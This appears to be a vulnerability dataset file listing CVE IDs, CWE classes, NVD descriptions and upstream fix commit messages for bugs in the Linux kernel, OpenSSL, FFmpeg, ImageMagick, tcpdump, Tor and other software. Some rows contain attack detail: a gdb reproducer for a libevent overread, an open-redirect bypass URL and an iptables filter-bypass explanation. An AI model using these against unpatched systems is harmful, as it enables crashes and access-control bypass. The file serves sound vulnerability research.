CVE-2014-8160,CWE-20,2015-03-02,"net/netfilter/nf_conntrack_proto_generic.c in the Linux kernel before 3.18 generates incorrect conntrack entries during handling of certain iptables rule sets for the SCTP, DCCP, GRE, and UDP-Lite protocols, which allows remote attackers to bypass intended access restrictions via packets with disallowed port numbers.","Given following iptables ruleset:  -P FORWARD DROP -A FORWARD -m sctp --dport 9 -j ACCEPT -A FORWARD -p tcp --dport 80 -j ACCEPT -A FORWARD -p tcp -m conntrack -m state ESTABLISHED,RELATED -j ACCEPT  One would assume that this allows SCTP on port 9 and TCP on port 80. Unfortunately, if the SCTP conntrack module is not loaded, this allows *all* SCTP communication, to pass though, i.e. -p sctp -j ACCEPT, which we think is a security issue.  This is because on the first SCTP packet on port 9, we create a dummy ""generic l4"" conntrack entry without any port information (since conntrack doesn't know how to extract this information).  All subsequent packets that are unknown will then be in established state since they will fallback to proto_generic and will match the 'generic' entry.  Our originally proposed version [1] completely disabled generic protocol tracking, but Jozsef suggests to not track protocols for which a more suitable helper is available, hence we now mitigate the issue for in tree known ct protocol helpers only, so that at least NAT and direction information will still be preserved for others.   [1] http://www.spinics.net/lists/netfilter-devel/msg33430.html  Joint work with Daniel Borkmann.  Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Acked-by: Jozsef Kadlecsik <kadlec@blackhole.kfki.hu> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2017-16530,CWE-125,2017-11-04,"The uas driver in the Linux kernel before 4.13.6 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device, related to drivers/usb/storage/uas-detect.h and drivers/usb/storage/uas.c.","The uas driver has a subtle bug in the way it handles alternate settings.  The uas_find_uas_alt_setting() routine returns an altsetting value (the bAlternateSetting number in the descriptor), but uas_use_uas_driver() then treats that value as an index to the intf->altsetting array, which it isn't.  Normally this doesn't cause any problems because the various alternate settings have bAlternateSetting values 0, 1, 2, ..., so the value is equal to the index in the array.  But this is not guaranteed, and Andrey Konovalov used the syzkaller fuzzer with KASAN to get a slab-out-of-bounds error by violating this assumption.  This patch fixes the bug by making uas_find_uas_alt_setting() return a pointer to the altsetting entry rather than either the value or the index.  Pointers are less subject to misinterpretation.  Signed-off-by: Alan Stern <stern@rowland.harvard.edu> Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> CC: Oliver Neukum <oneukum@suse.com> CC: <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2014-8884,CWE-119,2014-11-30,Stack-based buffer overflow in the ttusbdecfe_dvbs_diseqc_send_master_cmd function in drivers/media/usb/ttusb-dec/ttusbdecfe.c in the Linux kernel before 3.17.4 allows local users to cause a denial of service (system crash) or possibly gain privileges via a large message length in an ioctl call.,We need to add a limit check here so we don't overflow the buffer.  Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>
CVE-2016-0702,CWE-200,2016-03-03,"The MOD_EXP_CTIME_COPY_FROM_PREBUF function in crypto/bn/bn_exp.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g does not properly consider cache-bank access times during modular exponentiation, which makes it easier for local users to discover RSA keys by running a crafted application on the same Intel Sandy Bridge CPU core as a victim and leveraging cache-bank conflicts, aka a ""CacheBleed"" attack.",
CVE-2016-7526,CWE-787,2017-04-20,coders/wpg.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds write) via a crafted file.,
CVE-2016-2548,CWE-20,2016-04-27,"sound/core/timer.c in the Linux kernel before 4.4.1 retains certain linked lists after a close or stop action, which allows local users to cause a denial of service (system crash) via a crafted ioctl call, related to the (1) snd_timer_close and (2) _snd_timer_stop functions.","A slave timer instance might be still accessible in a racy way while operating the master instance as it lacks of locking.  Since the master operation is mostly protected with timer->lock, we should cope with it while changing the slave instance, too.  Also, some linked lists (active_list and ack_list) of slave instances aren't unlinked immediately at stopping or closing, and this may lead to unexpected accesses.  This patch tries to address these issues.  It adds spin lock of timer->lock (either from master or slave, which is equivalent) in a few places.  For avoiding a deadlock, we ensure that the global slave_active_lock is always locked at first before each timer lock.  Also, ack and active_list of slave instances are properly unlinked at snd_timer_stop() and snd_timer_close().  Last but not least, remove the superfluous call of _snd_timer_stop() at removing slave links.  This is a noop, and calling it may confuse readers wrt locking.  Further cleanup will follow in a later patch.  Actually we've got reports of use-after-free by syzkaller fuzzer, and this hopefully fixes these issues.  Reported-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2012-3510,CWE-399,2012-10-03,Use-after-free vulnerability in the xacct_add_tsk function in kernel/tsacct.c in the Linux kernel before 2.6.19 allows local users to obtain potentially sensitive information from kernel memory or cause a denial of service (system crash) via a taskstats TASKSTATS_CMD_ATTR_PID command.,Paranoid fix. The task can free its ->mm after the 'if (p->mm)' check.  Signed-off-by: Oleg Nesterov <oleg@tv-sign.ru> Cc: Shailabh Nagar <nagar@watson.ibm.com> Cc: Balbir Singh <balbir@in.ibm.com> Cc: Jay Lan <jlan@sgi.com> Signed-off-by: Andrew Morton <akpm@osdl.org> Signed-off-by: Linus Torvalds <torvalds@osdl.org>
CVE-2018-15132,CWE-200,2018-08-07,"An issue was discovered in ext/standard/link_win32.c in PHP before 5.6.37, 7.0.x before 7.0.31, 7.1.x before 7.1.20, and 7.2.x before 7.2.8. The linkinfo function on Windows doesn't implement the open_basedir check. This could be abused to find files on paths outside of the allowed directories.",
CVE-2016-7101,CWE-125,2017-01-18,The SGI coder in ImageMagick before 7.0.2-10 allows remote attackers to cause a denial of service (out-of-bounds read) via a large row value in an sgi file.,
CVE-2017-9150,CWE-200,2017-05-22,"The do_check function in kernel/bpf/verifier.c in the Linux kernel before 4.11.1 does not make the allow_ptr_leaks value available for restricting the output of the print_bpf_insn function, which allows local users to obtain sensitive address information via crafted bpf system calls.","The patch fixes two things at once:  1) It checks the env->allow_ptr_leaks and only prints the map address to    the log if we have the privileges to do so, otherwise it just dumps 0    as we would when kptr_restrict is enabled on %pK. Given the latter is    off by default and not every distro sets it, I don't want to rely on    this, hence the 0 by default for unprivileged.  2) Printing of ldimm64 in the verifier log is currently broken in that    we don't print the full immediate, but only the 32 bit part of the    first insn part for ldimm64. Thus, fix this up as well; it's okay to    access, since we verified all ldimm64 earlier already (including just    constants) through replace_map_fd_with_map_ptr().  Fixes: 1be7f75 (""bpf: enable non-root eBPF programs"") Fixes: cbd3570 (""bpf: verifier (add ability to receive verification log)"") Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net> Acked-by: Alexei Starovoitov <ast@kernel.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-10195,CWE-125,2017-03-15,"The name_parse function in evdns.c in libevent before 2.1.6-beta allows remote attackers to have unspecified impact via vectors involving the label_len variable, which triggers an out-of-bounds stack read.","@asn-the-goblin-slayer:   ""the name_parse() function in libevent's DNS code is vulnerable to a buffer overread.     971         if (cp != name_out) {    972             if (cp + 1 >= end) return -1;    973             *cp++ = '.';    974         }    975         if (cp + label_len >= end) return -1;    976         memcpy(cp, packet + j, label_len);    977         cp += label_len;    978         j += label_len;    No check is made against length before the memcpy occurs.     This was found through the Tor bug bounty program and the discovery should be credited to 'Guido Vranken'.""  Reproducer for gdb (https://gist.github.com/azat/e4fcf540e9b89ab86d02):   set $PROT_NONE=0x0   set $PROT_READ=0x1   set $PROT_WRITE=0x2   set $MAP_ANONYMOUS=0x20   set $MAP_SHARED=0x01   set $MAP_FIXED=0x10   set $MAP_32BIT=0x40    start    set $length=202   # overread   set $length=2   # allocate with mmap to have a seg fault on page boundary   set $l=(1<<20)*2   p mmap(0, $l, $PROT_READ|$PROT_WRITE, $MAP_ANONYMOUS|$MAP_SHARED|$MAP_32BIT, -1, 0)   set $packet=(char *)$1+$l-$length   # hack the packet   set $packet[0]=63   set $packet[1]='/'    p malloc(sizeof(int))   set $idx=(int *)$2   set $idx[0]=0   set $name_out_len=202    p malloc($name_out_len)   set $name_out=$3    # have WRITE only mapping to fail on read   set $end=$1+$l   p (void *)mmap($end, 1<<12, $PROT_NONE, $MAP_ANONYMOUS|$MAP_SHARED|$MAP_FIXED|$MAP_32BIT, -1, 0)   set $m=$4    p name_parse($packet, $length, $idx, $name_out, $name_out_len)   x/2s (char *)$name_out  Before this patch: $ gdb -ex 'source gdb' dns-example $1 = 1073741824 $2 = (void *) 0x633010 $3 = (void *) 0x633030 $4 = (void *) 0x40200000  Program received signal SIGSEGV, Segmentation fault. __memcpy_sse2_unaligned () at memcpy-sse2-unaligned.S:33  After this patch: $ gdb -ex 'source gdb' dns-example $1 = 1073741824 $2 = (void *) 0x633010 $3 = (void *) 0x633030 $4 = (void *) 0x40200000 $5 = -1 0x633030:       ""/"" 0x633032:       """" (gdb) p $m $6 = (void *) 0x40200000 (gdb) p $1 $7 = 1073741824 (gdb) p/x $1 $8 = 0x40000000 (gdb) quit  P.S. plus drop one condition duplicate.  Fixes: #317"
CVE-2017-9996,CWE-119,2017-06-28,"The cdxl_decode_frame function in libavcodec/cdxl.c in FFmpeg 2.8.x before 2.8.12, 3.0.x before 3.0.8, 3.1.x before 3.1.8, 3.2.x before 3.2.5, and 3.3.x before 3.3.1 does not exclude the CHUNKY format, which allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted file.",Fixes: out of array access Fixes: 1427/clusterfuzz-testcase-minimized-5020737339392000  Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpeg Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2018-17204,CWE-617,2018-09-19,"An issue was discovered in Open vSwitch (OvS) 2.7.x through 2.7.6, affecting parse_group_prop_ntr_selection_method in lib/ofp-util.c. When decoding a group mod, it validates the group type and command after the whole group mod has been decoded. The OF1.5 decoder, however, tries to use the type and command earlier, when it might still be invalid. This causes an assertion failure (via OVS_NOT_REACHED). ovs-vswitchd does not enable support for OpenFlow 1.5 by default.","When decoding a group mod, the current code validates the group type and command after the whole group mod has been decoded.  The OF1.5 decoder, however, tries to use the type and command earlier, when it might still be invalid.  This caused an assertion failure (via OVS_NOT_REACHED).  This commit fixes the problem.  ovs-vswitchd does not enable support for OpenFlow 1.5 by default.  Reported-at: https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=9249 Signed-off-by: Ben Pfaff <blp@ovn.org> Reviewed-by: Yifeng Sun <pkusunyifeng@gmail.com>"
CVE-2016-3698,CWE-284,2016-06-13,"libndp before 1.6, as used in NetworkManager, does not properly validate the origin of Neighbor Discovery Protocol (NDP) messages, which allows remote attackers to conduct man-in-the-middle attacks or cause a denial of service (network connectivity disruption) by advertising a node as a router from a non-local network.",RFC4861 suggests that these messages should only originate from link-local addresses in 6.1.2 (RA) and 8.1. (redirect):  Mitigates CVE-2016-3698.  Signed-off-by: Lubomir Rintel <lkundrak@v3.sk> Signed-off-by: Jiri Pirko <jiri@mellanox.com>
CVE-2012-2100,CWE-189,2012-07-03,"The ext4_fill_flex_info function in fs/ext4/super.c in the Linux kernel before 3.2.2, on the x86 platform and unspecified other platforms, allows user-assisted remote attackers to trigger inconsistent filesystem-groups data and possibly cause a denial of service via a malformed ext4 filesystem containing a super block with a large FLEX_BG group size (aka s_log_groups_per_flex value).  NOTE: this vulnerability exists because of an incomplete fix for CVE-2009-4307.","Commit 503358a (""ext4: avoid divide by zero when trying to mount a corrupted file system"") fixes CVE-2009-4307 by performing a sanity check on s_log_groups_per_flex, since it can be set to a bogus value by an attacker.  	sbi->s_log_groups_per_flex = sbi->s_es->s_log_groups_per_flex; 	groups_per_flex = 1 << sbi->s_log_groups_per_flex;  	if (groups_per_flex < 2) { ... }  This patch fixes two potential issues in the previous commit.  1) The sanity check might only work on architectures like PowerPC. On x86, 5 bits are used for the shifting amount.  That means, given a large s_log_groups_per_flex value like 36, groups_per_flex = 1 << 36 is essentially 1 << 4 = 16, rather than 0.  This will bypass the check, leaving s_log_groups_per_flex and groups_per_flex inconsistent.  2) The sanity check relies on undefined behavior, i.e., oversized shift. A standard-confirming C compiler could rewrite the check in unexpected ways.  Consider the following equivalent form, assuming groups_per_flex is unsigned for simplicity.  	groups_per_flex = 1 << sbi->s_log_groups_per_flex; 	if (groups_per_flex == 0 || groups_per_flex == 1) {  We compile the code snippet using Clang 3.0 and GCC 4.6.  Clang will completely optimize away the check groups_per_flex == 0, leaving the patched code as vulnerable as the original.  GCC keeps the check, but there is no guarantee that future versions will do the same.  Signed-off-by: Xi Wang <xi.wang@gmail.com> Signed-off-by: ""Theodore Ts'o"" <tytso@mit.edu> Cc: stable@vger.kernel.org"
CVE-2019-14763,CWE-667,2019-08-07,"In the Linux kernel before 4.16.4, a double-locking error in drivers/usb/dwc3/gadget.c may potentially cause a deadlock with f_hid.","In f_hidg_write() the write_spinlock is acquired before calling usb_ep_queue() which causes a deadlock when dummy_hcd is being used. This is because dummy_queue() callbacks into f_hidg_req_complete() which tries to acquire the same spinlock. This is (part of) the backtrace when the deadlock occurs:    0xffffffffc06b1410 in f_hidg_req_complete   0xffffffffc06a590a in usb_gadget_giveback_request   0xffffffffc06cfff2 in dummy_queue   0xffffffffc06a4b96 in usb_ep_queue   0xffffffffc06b1eb6 in f_hidg_write   0xffffffff8127730b in __vfs_write   0xffffffff812774d1 in vfs_write   0xffffffff81277725 in SYSC_write  Fix this by releasing the write_spinlock before calling usb_ep_queue()  Reviewed-by: James Bottomley <James.Bottomley@HansenPartnership.com> Tested-by: James Bottomley <James.Bottomley@HansenPartnership.com> Cc: stable@vger.kernel.org # 4.11+ Fixes: 749494b (""usb: gadget: f_hid: fix: Move IN request allocation to set_alt()"") Signed-off-by: Radoslav Gerganov <rgerganov@vmware.com> Signed-off-by: Felipe Balbi <felipe.balbi@linux.intel.com>"
CVE-2012-2870,CWE-399,2012-08-31,"libxslt 1.1.26 and earlier, as used in Google Chrome before 21.0.1180.89, does not properly manage memory, which might allow remote attackers to cause a denial of service (application crash) via a crafted XSLT expression that is not properly identified during XPath navigation, related to (1) the xsltCompileLocationPathPattern function in libxslt/pattern.c and (2) the xsltGenerateIdFunction function in libxslt/functions.c.",
CVE-2013-2232,CWE-20,2013-07-04,The ip6_sk_dst_check function in net/ipv6/ip6_output.c in the Linux kernel before 3.10 allows local users to cause a denial of service (system crash) by using an AF_INET6 socket for a connection to an IPv4 interface.,"It's possible to use AF_INET6 sockets and to connect to an IPv4 destination. After this, socket dst cache is a pointer to a rtable, not rt6_info.  ip6_sk_dst_check() should check the socket dst cache is IPv6, or else various corruptions/crashes can happen.  Dave Jones can reproduce immediate crash with trinity -q -l off -n -c sendmsg -c connect  With help from Hannes Frederic Sowa  Reported-by: Dave Jones <davej@redhat.com> Reported-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: Eric Dumazet <edumazet@google.com> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-7799,CWE-125,2017-01-18,MagickCore/profile.c in ImageMagick before 7.0.3-2 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted file.,
CVE-2016-10268,CWE-191,2017-03-24,"tools/tiffcp.c in LibTIFF 4.0.7 allows remote attackers to cause a denial of service (integer underflow and heap-based buffer under-read) or possibly have unspecified other impact via a crafted TIFF image, related to ""READ of size 78490"" and libtiff/tif_unix.c:115:23.","can cause various issues, such as buffer overflows in the library. Reported by Agostino Sarubbo. Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2598"
CVE-2018-12322,CWE-125,2018-06-13,There is a heap out of bounds read in radare2 2.6.0 in _6502_op() in libr/anal/p/anal_6502.c via a crafted iNES ROM binary file.,
CVE-2015-3905,CWE-119,2015-06-08,Buffer overflow in the set_cs_start function in t1disasm.c in t1utils before 1.39 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a crafted font file.,"- Don't overflow the small cs_start buffer (reported by Niels   Thykier via the debian tracker (Jakub Wilk), found with a   fuzzer (""American fuzzy lop"")).  - Cast arguments to <ctype.h> functions to unsigned char."
CVE-2015-1870,CWE-200,2017-06-26,"The event scripts in Automatic Bug Reporting Tool (ABRT) uses world-readable permission on a copy of sosreport file in problem directories, which allows local users to obtain sensitive information from /var/log/messages via unspecified vectors.","The 0660 allows root escalations in ABRT. We don't really need to have the dump directories writable for the group as ABRT processes run under root. We introduced 0x1 for group with the switch to /var/tmp/abrt because we thought that we will have ABRT processes run under the user abrt, but there are no signs that we will ever pursue such a setup.  Related: #1212861  Signed-off-by: Jakub Filak <jfilak@redhat.com>"
CVE-2016-3951,,2016-05-02,Double free vulnerability in drivers/net/usb/cdc_ncm.c in the Linux kernel before 4.5 allows physically proximate attackers to cause a denial of service (system crash) or possibly have unspecified other impact by inserting a USB device with an invalid USB descriptor.,"usbnet_link_change will call schedule_work and should be avoided if bind is failing. Otherwise we will end up with scheduled work referring to a netdev which has gone away.  Instead of making the call conditional, we can just defer it to usbnet_probe, using the driver_info flag made for this purpose.  Fixes: 8a34b0a (""usbnet: cdc_ncm: apply usbnet_link_change"") Reported-by: Andrey Konovalov <andreyknvl@gmail.com> Suggested-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Bjørn Mork <bjorn@mork.no> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-18075,CWE-763,2018-01-24,"crypto/pcrypt.c in the Linux kernel before 4.14.13 mishandles freeing instances, allowing a local user able to access the AF_ALG-based AEAD interface (CONFIG_CRYPTO_USER_API_AEAD) and pcrypt (CONFIG_CRYPTO_PCRYPT) to cause a denial of service (kfree of an incorrect pointer) or possibly have unspecified other impact by executing a crafted sequence of system calls.","pcrypt is using the old way of freeing instances, where the ->free() method specified in the 'struct crypto_template' is passed a pointer to the 'struct crypto_instance'.  But the crypto_instance is being kfree()'d directly, which is incorrect because the memory was actually allocated as an aead_instance, which contains the crypto_instance at a nonzero offset.  Thus, the wrong pointer was being kfree()'d.  Fix it by switching to the new way to free aead_instance's where the ->free() method is specified in the aead_instance itself.  Reported-by: syzbot <syzkaller@googlegroups.com> Fixes: 0496f56 (""crypto: pcrypt - Add support for new AEAD interface"") Cc: <stable@vger.kernel.org> # v4.2+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2013-1957,CWE-264,2013-04-24,"The clone_mnt function in fs/namespace.c in the Linux kernel before 3.8.6 does not properly restrict changes to the MNT_READONLY flag, which allows local users to bypass an intended read-only property of a filesystem by leveraging a separate mount namespace.","As a matter of policy MNT_READONLY should not be changable if the original mounter had more privileges than creator of the mount namespace.  Add the flag CL_UNPRIVILEGED to note when we are copying a mount from a mount namespace that requires more privileges to a mount namespace that requires fewer privileges.  When the CL_UNPRIVILEGED flag is set cause clone_mnt to set MNT_NO_REMOUNT if any of the mnt flags that should never be changed are set.  This protects both mount propagation and the initial creation of a less privileged mount namespace.  Cc: stable@vger.kernel.org Acked-by: Serge Hallyn <serge.hallyn@canonical.com> Reported-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com>"
CVE-2018-16452,CWE-674,2019-10-03,The SMB parser in tcpdump before 4.9.3 has stack exhaustion in smbutil.c:smb_fdata() via recursion.,Enforce a limit on how many times smb_fdata() can recurse.  This fixes a stack exhaustion discovered by Include Security working under the Mozilla SOS program in 2018 by means of code audit.
CVE-2017-7854,CWE-125,2017-04-13,The consume_init_expr function in wasm.c in radare2 1.3.0 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) via a crafted Web Assembly file.,
CVE-2017-6594,CWE-295,2017-08-28,The transit path validation code in Heimdal before 7.3 might allow attackers to bypass the capath policy protection mechanism by leveraging failure to add the previous hop realm to the transit path of issued tickets.,"Commit f469fc6 (2010-10-02) inadvertently caused the previous hop realm to not be added to the transit path of issued tickets.  This may, in some cases, enable bypass of capath policy in Heimdal versions 1.5 through 7.2.  Note, this may break sites that rely on the bug.  With the bug some incomplete [capaths] worked, that should not have.  These may now break authentication in some cross-realm configurations."
CVE-2017-13016,CWE-125,2017-09-14,The ISO ES-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:esis_print().,
CVE-2014-9895,CWE-200,2016-08-06,"drivers/media/media-device.c in the Linux kernel before 3.11, as used in Android before 2016-08-05 on Nexus 5 and 7 (2013) devices, does not properly initialize certain data structures, which allows local users to obtain sensitive information via a crafted application, aka Android internal bug 28750150 and Qualcomm internal bug CR570757, a different vulnerability than CVE-2014-1739.",These structs have holes and reserved struct members which aren't cleared.  I've added a memset() so we don't leak stack information.  Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Laurent Pinchart <laurent.pinchart@ideasonboard.com> Signed-off-by: Mauro Carvalho Chehab <mchehab@redhat.com>
CVE-2018-1999014,CWE-125,2018-07-23,FFmpeg before commit bab0716c7f4793ec42e05a5aa7e80d82a0dd4e75 contains an out of array access vulnerability in MXF format demuxer that can result in DoS. This attack appear to be exploitable via specially crafted MXF file which has to be provided as input. This vulnerability appears to have been fixed in bab0716c7f4793ec42e05a5aa7e80d82a0dd4e75 and later.,Fixes: out of array access Fixes: mxf-crash-1c2e59bf07a34675bfb3ada5e1ec22fa9f38f923  Found-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2019-3877,CWE-601,2019-03-27,"A vulnerability was found in mod_auth_mellon before v0.14.2. An open redirect in the logout URL allows requests with backslashes to pass through by assuming that it is a relative URL, while the browsers silently convert backslash characters into forward slashes treating them as an absolute URL. This mismatch allows an attacker to bypass the redirect URL validation logic in apr_uri_parse function.","It turns out that browsers silently convert backslash characters into forward slashes, while apr_uri_parse() does not.  This mismatch allows an attacker to bypass the redirect URL validation by using an URL like:    https://sp.example.org/mellon/logout?ReturnTo=https:%5c%5cmalicious.example.org/  mod_auth_mellon will assume that it is a relative URL and allow the request to pass through, while the browsers will use it as an absolute url and redirect to https://malicious.example.org/ .  This patch fixes this issue by rejecting all redirect URLs with backslashes."
CVE-2017-14991,CWE-200,2017-10-04,The sg_ioctl function in drivers/scsi/sg.c in the Linux kernel before 4.13.4 allows local users to obtain sensitive information from uninitialized kernel heap-memory locations via an SG_GET_REQUEST_TABLE ioctl call for /dev/sg0.,When calling SG_GET_REQUEST_TABLE ioctl only a half-filled table is returned; the remaining part will then contain stale kernel memory information.  This patch zeroes out the entire table to avoid this issue.  Signed-off-by: Hannes Reinecke <hare@suse.com> Reviewed-by: Bart Van Assche <bart.vanassche@wdc.com> Reviewed-by: Christoph Hellwig <hch@lst.de> Reviewed-by: Eric Dumazet <edumazet@google.com> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>
CVE-2016-10161,CWE-125,2017-01-24,"The object_common1 function in ext/standard/var_unserializer.c in PHP before 5.6.30, 7.0.x before 7.0.15, and 7.1.x before 7.1.1 allows remote attackers to cause a denial of service (buffer over-read and application crash) via crafted serialized data that is mishandled in a finish_nested_data call.",
CVE-2017-0377,CWE-200,2017-07-02,"Tor 0.3.x before 0.3.0.9 has a guard-selection algorithm that only considers the exit relay (not the exit relay's family), which might allow remote attackers to defeat intended anonymity properties by leveraging the existence of large families.","When the new path selection logic went into place, I accidentally dropped the code that considered the _family_ of the exit node when deciding if the guard was usable, and we didn't catch that during code review.  This patch makes the guard_restriction_t code consider the exit family as well, and adds some (hopefully redundant) checks for the case where we lack a node_t for a guard but we have a bridge_info_t for it.  Fixes bug 22753; bugfix on 0.3.0.1-alpha. Tracked as TROVE-2016-006 and CVE-2017-0377."
CVE-2012-0879,CWE-400,2012-05-17,"The I/O implementation for block devices in the Linux kernel before 2.6.33 does not properly handle the CLONE_IO feature, which allows local users to cause a denial of service (I/O instability) by starting multiple processes that share an I/O context.","With CLONE_IO, parent's io_context->nr_tasks is incremented, but never decremented whenever copy_process() fails afterwards, which prevents exit_io_context() from calling IO schedulers exit functions.  Give a task_struct to exit_io_context(), and call exit_io_context() instead of put_io_context() in copy_process() cleanup path.  Signed-off-by: Louis Rilling <louis.rilling@kerlabs.com> Signed-off-by: Jens Axboe <jens.axboe@oracle.com>"
CVE-2014-2957,CWE-20,2014-09-04,"The dmarc_process function in dmarc.c in Exim before 4.82.1, when EXPERIMENTAL_DMARC is enabled, allows remote attackers to execute arbitrary code via the From header in an email, which is passed to the expand_string function.",
CVE-2018-15857,CWE-416,2018-08-25,An invalid free in ExprAppendMultiKeysymList in xkbcomp/ast-build.c in xkbcommon before 0.8.1 could be used by local attackers to crash xkbcommon keymap parsers or possibly have unspecified other impact by supplying a crafted keymap file.,Signed-off-by: Peter Hutterer <peter.hutterer@who-t.net>
CVE-2016-7916,CWE-362,2016-11-16,Race condition in the environ_read function in fs/proc/base.c in the Linux kernel before 4.5.4 allows local users to obtain sensitive information from kernel memory by reading a /proc/*/environ file during a process-setup time interval in which environment-variable copying is incomplete.,"If /proc/<PID>/environ gets read before the envp[] array is fully set up in create_{aout,elf,elf_fdpic,flat}_tables(), we might end up trying to read more bytes than are actually written, as env_start will already be set but env_end will still be zero, making the range calculation underflow, allowing to read beyond the end of what has been written.  Fix this as it is done for /proc/<PID>/cmdline by testing env_end for zero.  It is, apparently, intentionally set last in create_*_tables().  This bug was found by the PaX size_overflow plugin that detected the arithmetic underflow of 'this_len = env_end - (env_start + src)' when env_end is still zero.  The expected consequence is that userland trying to access /proc/<PID>/environ of a not yet fully set up process may get inconsistent data as we're in the middle of copying in the environment variables.  Fixes: https://forums.grsecurity.net/viewtopic.php?f=3&t=4363 Fixes: https://bugzilla.kernel.org/show_bug.cgi?id=116461 Signed-off-by: Mathias Krause <minipli@googlemail.com> Cc: Emese Revfy <re.emese@gmail.com> Cc: Pax Team <pageexec@freemail.hu> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Mateusz Guzik <mguzik@redhat.com> Cc: Alexey Dobriyan <adobriyan@gmail.com> Cc: Cyrill Gorcunov <gorcunov@openvz.org> Cc: Jarod Wilson <jarod@redhat.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-0376,CWE-617,2017-06-09,The hidden-service feature in Tor before 0.3.0.8 allows a denial of service (assertion failure and daemon exit) in the connection_edge_process_relay_cell function via a BEGIN_DIR cell on a rendezvous circuit.,"On an hidden service rendezvous circuit, a BEGIN_DIR could be sent (maliciously) which would trigger a tor_assert() because connection_edge_process_relay_cell() thought that the circuit is an or_circuit_t but is an origin circuit in reality.  Fixes #22494  Reported-by: Roger Dingledine <arma@torproject.org> Signed-off-by: David Goulet <dgoulet@torproject.org>"
CVE-2014-0203,CWE-416,2014-06-23,"The __do_follow_link function in fs/namei.c in the Linux kernel before 2.6.33 does not properly handle the last pathname component during use of certain filesystems, which allows local users to cause a denial of service (incorrect free operations and system crash) via an open system call.","We end up trying to kfree() nd.last.name on open(""/mnt/tmp"", O_CREAT) if /mnt/tmp is an autofs direct mount.  The reason is that nd.last_type is bogus here; we want LAST_BIND for everything of that kind and we get LAST_NORM left over from finding parent directory.  So make sure that it *is* set properly; set to LAST_BIND before doing ->follow_link() - for normal symlinks it will be changed by __vfs_follow_link() and everything else needs it set that way.  Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2017-8068,CWE-119,2017-04-23,"drivers/net/usb/pegasus.c in the Linux kernel 4.9.x before 4.9.11 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","Allocating USB buffers on the stack is not portable, and no longer works on x86_64 (with VMAP_STACK enabled as per default).  Fixes: 1da177e4c3f4 (""Linux-2.6.12-rc2"") References: https://bugs.debian.org/852556 Reported-by: Lisandro Damián Nicanor Pérez Meyer <lisandro@debian.org> Tested-by: Lisandro Damián Nicanor Pérez Meyer <lisandro@debian.org> Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-6304,CWE-401,2016-09-26,"Multiple memory leaks in t1_lib.c in OpenSSL before 1.0.1u, 1.0.2 before 1.0.2i, and 1.1.0 before 1.1.0a allow remote attackers to cause a denial of service (memory consumption) via large OCSP Status Request extensions.",
CVE-2011-3637,CWE-476,2012-05-17,The m_stop function in fs/proc/task_mmu.c in the Linux kernel before 2.6.39 allows local users to cause a denial of service (OOPS) via vectors that trigger an m_start error.,"When m_start returns an error, the seq_file logic will still call m_stop with that error entry, so we'd better make sure that we check it before using it as a vma.  Introduced by commit ec6fd8a (""report errors in /proc/*/*map* sanely""), which replaced NULL with various ERR_PTR() cases.  (On ia64, you happen to get a unaligned fault instead of a page fault, since the address used is generally some random error code like -EPERM)  Reported-by: Anca Emanuel <anca.emanuel@gmail.com> Reported-by: Tony Luck <tony.luck@intel.com> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: Américo Wang <xiyou.wangcong@gmail.com> Cc: Stephen Wilson <wilsons@start.ca> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
